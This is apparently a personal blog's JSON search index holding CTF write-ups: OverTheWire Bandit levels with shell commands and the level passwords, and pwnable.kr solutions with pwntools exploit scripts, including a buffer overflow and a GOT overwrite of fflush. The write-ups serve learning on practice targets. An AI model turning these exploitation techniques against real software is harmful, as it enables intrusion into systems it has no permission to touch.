{"meta":{"title":"Firework","subtitle":"","description":"Less_is_more","author":"Firework","url":"http://example.com","root":"/"},"pages":[{"title":"标签","date":"2021-04-08T07:13:42.902Z","updated":"2021-04-08T07:13:42.893Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-04-08T07:15:38.000Z","updated":"2021-04-08T07:16:14.735Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-04-08T07:14:19.440Z","updated":"2021-04-08T07:14:19.423Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"linux_base题解","slug":"linux_Base","date":"2021-04-20T01:22:12.567Z","updated":"2021-04-20T10:29:01.553Z","comments":true,"path":"2021/04/20/linux_Base/","link":"","permalink":"http://example.com/2021/04/20/linux_Base/","excerpt":"","text":"linux_base题解重新系统地过一遍，主要是一些Linux的基本命令和基础知识。 Level_0What is SSH ? According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Host Name : bandit.labs.overthewire.org Username : **bandit0** Password : **bandit0** Port Number : 2220 1ssh bandit0@bandit.labs.overthewire.org -p 2220 Level_0➡Level_1Usage of ls and cat: 1234bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level_1➡Level_2cat the file stars with dash: 1234bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9bandit1@bandit:~$ cat &lt;-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level_2➡Level_3​ Use” \\“ escape character 1234bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level_3➡Level_4Usage of command : ls 、cd: The ls command is used to view the contents of a directory. By default, this command will display the contents of your current working directory. If you want to see the content of other directories, type ls and then the directory’s path. For example, enter ls /home/username/Documents to view the content of Documents. There are variations you can use with the ls command: ls -R will list all the files in the sub-directories as well ls -a will show the hidden files ls -al will list the files and directories with detailed information like the permissions, size, owner, etc. Hidden file: start with . is hidden file 123456789101112bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 3 root root 4096 May 7 2020 ..-rw-r----- 1 bandit4 bandit3 33 May 7 2020 .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level_4➡Level_5Usage of command : file 1file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...] -b 列出辨识结果时，不显示文件名称。 -c 详细显示指令执行过程，便于排错或分析程序执行的情形。 -f&lt;名称文件&gt; 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。 -L 直接显示符号连接所指向的文件的类别。 -m&lt;魔法数字文件&gt; 指定魔法数字文件。 -v 显示版本信息。 -z 尝试去解读压缩文件的内容。 1234567891011121314151617181920bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level_5➡Level_6Usage of file: 12345678910bandit5@bandit:~/inhere$ lsmaybehere00 maybehere04 maybehere08 maybehere12 maybehere16maybehere01 maybehere05 maybehere09 maybehere13 maybehere17maybehere02 maybehere06 maybehere10 maybehere14 maybehere18maybehere03 maybehere07 maybehere11 maybehere15 maybehere19bandit5@bandit:~/inhere$ find ./ -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level_6➡Level_7Learn about redirection: Analyse: The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size So this is exp: find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null / from root folder -user the owner of the file. -group the group owner of the file. -size the size of the file. 2&gt;/dev/null redirects error messages to null so that they do not show on stdout. 1234bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level_7➡Level_8Learn about the pipe and usage if grep: grep commandIt lets you search through all the text in a given file. To illustrate, grep blue notepad.txt will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully. 1234567-i 忽略大小写-E 启用POSIX扩展正则表达式-P 启用perl正则-o 只输出正则表达式匹配的内容-w 整字匹配-v 不匹配的-n 输出行号 12bandit7@bandit:~$ cat data.txt |grep millionthmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level_8➡Level_9Learn about the sort and uniq: sort: 1sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][--help][--verison][文件] -u 在输出行中去除重复行。 -r sort默认的排序方式是升序，如果想改成降序，就加个-r即可。 -n sort要以数值来排序 -t 指定分割符 -k 指定第几列排序 uniq: 1uniq [-cdu][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--help][--version][输入文件][输出文件] -c, –count 在每行前显示该行重复次数 -d, –repeated 只输出重复的行 -D, –all-repeated 只输出重复的行，不过有几行输出几行 -f, –skip-fields=N -f 忽略的段数，-f 1 忽略第一段 -i, –ignore-case 不区分大小写 -s, –skip-chars=N 与-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符 -u, –unique 去除重复的后，全部显示出来，根mysql的distinct功能上有点像 1234bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level_9➡Level_10Usage of grep: strings : export strings in binary file 12345678910111213141516bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ cat data.txt |grep =Binary file (standard input) matchesbandit9@bandit:~$ strings data.txt |grep =========== the*2i&quot;4=:G e========== password&lt;I=zsGiZ)========== isA=|t&amp;EZdb=c^ LAh=3G*SF=s&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level_10➡Level_11What’s base64? Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。 why base64？ This_is_why_base64 12bandit10@bandit:~$ cat data.txt | base64 -dThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level_11➡Level_12ROT13: I_know_what’s_ROT13 command tr: 123456tr [选项]… 集合1 [集合2]选项说明：-c, -C, –complement 用集合1中的字符串替换，要求字符集为ASCII。-d, –delete 删除集合1中的字符而不是转换-s, –squeeze-repeats 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。-t, –truncate-set1 先删除第一字符集较第二字符集多出的字符 12bandit11@bandit:~$ cat data.txt | tr &quot;A-Za-z&quot; &quot;N-ZA-Mn-za-m&quot;The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level_12➡Level_13Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar: Linux hexdump命令一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。 1hexdump [选项] [文件]... 123456789-n length 只格式化输入文件的前length个字节。-C 输出规范的十六进制和ASCII码。-b 单字节八进制显示。-c 单字节字符显示。-d 双字节十进制显示。-o 双字节八进制显示。-x 双字节十六进制显示。-s 从偏移量开始输出。-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;。 每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a&gt;b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如： 1234%02d：两位十进制%03x：三位十六进制%02o：两位八进制%c：单个字符等 还有一些特殊的用法： 1234%_ad：标记下一个输出字节的序号，用十进制表示。%_ax：标记下一个输出字节的序号，用十六进制表示。%_ao：标记下一个输出字节的序号，用八进制表示。%_p：对不能以常规字符显示的用 . 代替。 同一行如果要显示多个格式字符串，则可以跟多个-e选项。 Demo: 1234hexdump -e &#x27;16/1 &quot;%02X &quot; &quot; | &quot;&#x27; -e &#x27;16/1 &quot;%_p&quot; &quot;\\n&quot;&#x27; test00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ................ 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F | ................ 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F | !&quot;#$%&amp;&#x27;()*+,-./ xxd xxd是二进制查看命令，默认将2文件显示为16进制字符串表示形式。 Usage: 1xxd [options] [infile [outfile]] or 1xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]] options: -a 缺省忽略转换: 使用‘*’替换空行. -b 二进数数据转储 (与 -ps,-i,-r不兼容). 默认为16进制. -c cols 每行多少列octets（特制8比特的字节）. 默认为16列(-i: 12, -ps: 30). -E 使用EBCDIC字符集. 默认为ASCII字符集. -e 小端模式转储 (与 -ps,-i,-r不兼容). -g 在正常输出中，每组八位字节数. 默认为2个 (-e: 4). -h 输出此帮助. -i 使用C语言文件样式输出. -r reverse operation: convert (or patch) hexdump into binary. bzip2、gzip： 解压压缩命令 Options： -d ：解压 -k：保留源文件 tar: tar可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 1tar(选项)(参数) options： 1234567891011121314151617181920212223-A或--catenate：新增文件到以存在的备份文件；-B：设置区块大小；-c或--create：建立新的备份文件；-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。-d：记录文件的差别；-x或--extract或--get：从备份文件中还原文件；-t或--list：列出备份文件的内容；-z或--gzip或--ungzip：通过gzip指令处理备份文件；-Z或--compress或--uncompress：通过compress指令处理备份文件；-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；-v或--verbose：显示指令执行过程；-r：添加文件到已经压缩的文件；-u：添加改变了和现有的文件到已经存在的压缩文件；-j：支持bzip2解压文件；-v：显示操作过程；-l：文件系统边界设置；-k：保留原有文件不覆盖；-m：保留文件不被覆盖；-w：确认压缩文件的正确性；-p或--same-permissions：用原来的文件权限还原文件；-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。 123456789bandit12@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r----- 1 bandit13 bandit12 2582 May 7 2020 data.txt-rw-r--r-- 1 root root 675 May 15 2017 .profile 查看data.txt文件后发现是二进制文件hexdump后的文件，但是该目录下我们并没有权限对该文件进行xxd操作 ls -al / root查看root目录下tmp文件我们具有权限 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253bandit12@bandit:~$ mkdir /tmp/what_a_fuckbandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txtbandit12@bandit:~$ cd /tmp/what_a_fuckbandit12@bandit:/tmp/what_a_fuck$ lsdata.txtbandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.binbandit12@bandit:/tmp/what_a_fuck$ lsdata.bin data.txtbandit12@bandit:/tmp/what_a_fuck$ file data.bindata.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf datadata5.binbandit12@bandit:/tmp/what_a_fuck$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data5.bin data6.binbandit12@bandit:/tmp/what_a_fuck$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data5.bin data.txt fuckbandit12@bandit:/tmp/what_a_fuck$ file fuckfuck: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuckdata8.binbandit12@bandit:/tmp/what_a_fuck$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz bandit12@bandit:/tmp/what_a_fuck$ file shitshit: ASCII textbandit12@bandit:/tmp/what_a_fuck$ cat shit The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level_13➡Level_14用所给密钥登录bandit14账号连接到主机即可 123456bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostbandit14@bandit:/etc$ cd /etc/bandit_passbandit14@bandit:/etc/bandit_pass$ cat bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level_14➡Level_15Man is a good command 🙂 Learn about nc NAME nc — arbitrary TCP and UDP connections and listens SYNOPSIS nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [-Z peercertfile] [destination] [port] DESCRIPTION The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Most used options -g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个; -G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数; -h：在线帮助; -i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口; -l：使用监听模式，监控传入的资料; -n：直接使用ip地址，而不通过域名服务器; -o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存; -p&lt;通信端口&gt;：设置本地主机使用的通信端口; -r：指定源端口和目的端口都进行随机的选择; -s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址; -u：使用UDP传输协议; -v：显示指令执行过程; -w&lt;超时秒数&gt;：设置等待连线的时间; -z：使用0输入/输出模式，只在扫描通信端口时使用。 1234bandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr Level_15➡Level_16Level_16➡Level_17Level_17➡Level_18Level_18➡Level_19Level_19➡Level_20Level_20➡Level_21Level_21➡Level_22Level_22➡Level_23Level_23➡Level_24Level_24➡Level_25Level_25➡Level_26Level_26➡Level_27Level_27➡Level_28Level_28➡Level_29Level_29➡Level_30Level_30➡Level_31Level_31➡Level_32Level_32➡Level_33","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Web题解_natas","slug":"Web_1","date":"2021-04-20T01:04:24.027Z","updated":"2021-04-20T01:03:59.786Z","comments":true,"path":"2021/04/20/Web_1/","link":"","permalink":"http://example.com/2021/04/20/Web_1/","excerpt":"","text":"Web题解_natasEasy_web入门刷题","categories":[{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"}]},{"title":"Pwnable_game题解_1","slug":"Pwn_1","date":"2021-04-19T16:59:27.486Z","updated":"2021-04-20T00:51:21.326Z","comments":true,"path":"2021/04/20/Pwn_1/","link":"","permalink":"http://example.com/2021/04/20/Pwn_1/","excerpt":"","text":"Pwnable_games开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp fdTips: main函数的三个参数 int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 Linux 文件IO部分理解 所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行： 打开文件 ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。 文件描述符fd： 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。 Linux shell创建的每个进程开始时都有三个打开的文件： 12345stdin 标准输入的文件标识符为0 stdout 标准输出的文件标识符为1stderr 标准错误输出的文件标识符为2 Exp: 1234567891011#coding=utf-8from pwn import *payload=str(0x1234)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;fd&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&#x27;fd.c&#x27;)sh = shell.run(&#x27;./fd&#x27;+&#x27; &#x27;+payload)payload=&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() collisionTips: 跟哈希相关不大（× 可能是我没有get到出题人的意思 思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。 具体计算方法为： 12(568134124 + 1) / 5 = 113626825 = 0x6C5CEC90x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8 那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下： 1\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 这里采用小端存储方式。 小端存储：高字节保存在内存高地址，低字节保存在内存低地址中 这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入 下面两张图说明问题：（×其实还并不能说明问题 但是我们并不知道输入的命令行参数在内存存储的增长方向😀 各种Google均无果。。无奈下手动测试一下。 Test Code: 12345678910 #include&lt;stdio.h&gt; int main(int argc,char* argv[],char* env[]) &#123;for(int i=0;i&lt;=2;i++) printf(&quot;argv[%d]:%p\\n&quot;,i,argv[i]); int i=0; printf(&quot;stack:%p\\n&quot;,&amp;i); printf(&quot;env:%p\\n&quot;,env[i]); return 0; &#125; 实践出真知: 输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。 那么就很容易明白为什么逆序输入int四个字节了。 以为0x6C5CEC9和0x6C5CEC8为例 我们传入命令行参数argv[1]对应的字节序列为 \\xc9\\xce\\xc5\\x06\\x12\\x34\\x56\\x78实际存储时如下方式存储如下： 高地址8 78高地址7 56高地址6 34高地址5 12高地址4 06高地址3 c5高地址2 ce高地址1 c9 int型号指针ip指向高地址1 那么由于int型号为小端存储，四个字节依次读取 ip[i]=0x06C5CEC9 ip[2]=0x78563412 网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。 以上内容原创。转载注明出处。 PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现 Demo: 1`python -c print &#x27;\\xAB\\xCD&#x27;` Exp: 12345678#coding=utf-8from pwn import *payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;col&#x27;,password=&#x27;guest&#x27;,port=2222)sh = shell.run(&#x27;./col&#x27;+&#x27; &#x27;+payload)sh.interactive() bofAnalyse: get简单的溢出 IDA静态查看arg[1]和数组key对应的VA地址，计算出偏移为0x52 Exp: 1234567#coding=utf-8from pwn import *io=remote(&quot;pwnable.kr&quot;,9000)payload=&#x27;a&#x27;*(0x2c+0x8)+p32(0xcafebabe)io.sendline(payload)io.interactive() flagAnalyse: IDA静态分析发现里面内容少得可怜..很明显是加壳了 这里需要用到strings命令，一个技巧可以获得关键的信息： 1strings -20 flag 显示flag文件中至少包含20个字符的字符串，定位关键信息： 1Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net Google后简单了解了一下upx ，是个压缩壳 upx -d 解压一下即可 然后字符搜索关键词字 :) #注意此处需要转义字符 1strings flag |grep \\:\\) passcodesouce code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;//这个条件一旦成立就可以pwn printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;&#125; key points: scanf函数: scanf(&quot;%d&quot;, passcode1); 缺少一个&amp;这时函数执行时，会将passcode1作为地址进行写入操作，同理对应passcode2一样。一旦这两个不可控的地址是不可写或访问的，那么程序就crash了。 那么对passcode1和2地址的构造，然后利用scanf函数在该地址进行写入数据会是关键。 Analyse： 函数流程分析 welcome:可以在name数组中写入长度位100字节的字符 接下来无缝执行 login： 对passcode1地址上进行写入数据 ➡ 调用fflush(stdin); ➡ 输入passcode2 ➡check为真后输出flag 由于welcome()和login()这两个函数之间执行期间没有其他操作，可以分析得出前后进入这两个栈帧时，他们的EBP是一样的，自然可以想到我们可以领用name数组对passcode1和passcode2进行覆盖。 IDA静态分析： name数组数组的地址为：EBP-70H passcode1地址: EBP-10H passcode2地址: EBP-0cH welcome（）和login（）这两个函数栈帧的EBP一样只是我们的猜测，我们可以用gdb动态调试验证查看是否确实相同。 下载ELF文件： 1234#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)shell.download_file(&quot;./passcode&quot;) 修改权限 1chmod 777 passcode 查看内存保护信息： 1checksec passcode 此处的RELRO信息为关键点，关于checksec 查看内存保护信息参阅这篇： linux内存保护信息 gdb动态调试： 查看验证：确实两个函数栈帧的EBP相同，那么自然想到可以利用name数组对passcode1和2进行覆盖，但是注意到数组name大小是100字节，name首地址到passcode1首地址距离为96，我们组多能利用name数组的最后四个字节覆盖passcode1，无法覆盖到passcode2 注意到输入passcode1后，立即执行了 fflush(stdin) 【用于更新缓冲区】函数，调用这个函数的时候会利用linux的动态延迟加载。 此处需要恶补一下GOT和PLT表的关系以及linux动态延迟加载的一些只是： 参考这篇非常详细 参阅完毕后就可以进行exp Hijack GOT： 修改某个被调用函数的地址，让其指向另一个函数 这里我们修改调用fflush的地址，改为cat flag指令的地址，然后成功执行cat flag指令得到flag。 最后要做的就是找到调用fflush的地址和cat flag的地址，然后用name数组对passcode1覆盖为fflush的GOT表项地址，然后用scanf函数对GOT表象覆写为输出flag的指令即可。 找到fflush的GOT表项地址: 0x0804a004 找到cat flag 指令地址为：0x080485E3 Exp： 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)sysh_addr=0x080485E3fflush_got=0x0804a004payload=&quot;a&quot;*(100-4)+p32(fflush_got)sh=shell.run(&#x27;./passcode&#x27;)sh.sendlineafter(&quot;enter you name :&quot;,payload)payload=str(sysh_addr)sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)sh.interactive() random一个C语言的知识点：如果用户在rand()之前没有调用过sand(),那么系统默认将1作为伪随机数的初始值，如果给定了一个值，那么每次rand()产生的随机数序列都是一样的。 EXP 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;random&#x27;,password=&#x27;guest&#x27;,port=2222)payload=str(3039230856)sh=shell.run(&#x27;./random&#x27;)sh.sendline(payload)sh.interactive() input主要考察linux的一些基本参数传递，这里就当做学习python的一些模块。。 subprocess模块 Demo: 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None) args：表示要执行的命令。必须是一个字符串，字符串参数列表。 stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。 timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。 check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。 encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。 shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。 os模块 该模块提供了一些方便使用操作系统相关功能的函数。 fdopen()函数：创建文件对象 os.fdopen(fd, **args,**kwargs):返回打开文件描述符 fd 对应文件的对象。类似内建 open() 函数，二者接受同样的参数。不同之处在于 fdopen() 第一个参数应该为整数。 open()函数： 打开文件对象 file 是一个 path-like object，表示将要打开的文件的路径（绝对路径或者当前工作目录的相对路径），也可以是要被封装的整数类型文件描述符。（如果是文件描述符，它会随着返回的 I/O 对象关闭而关闭，除非 closefd 被设为 False 。） open(file, mode=’r’, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) mode 是一个可选字符串，用于指定打开文件的模式。默认值是 &#39;r&#39; ，这意味着它以文本模式打开并读取。其他常见模式有：写入 &#39;w&#39; （截断已经存在的文件）；排它性创建 &#39;x&#39; ；追加写 &#39;a&#39; （在 一些 Unix 系统上，无论当前的文件指针在什么位置，所有 写入都会追加到文件末尾）。在文本模式，如果 encoding 没有指定，则根据平台来决定使用的编码：使用 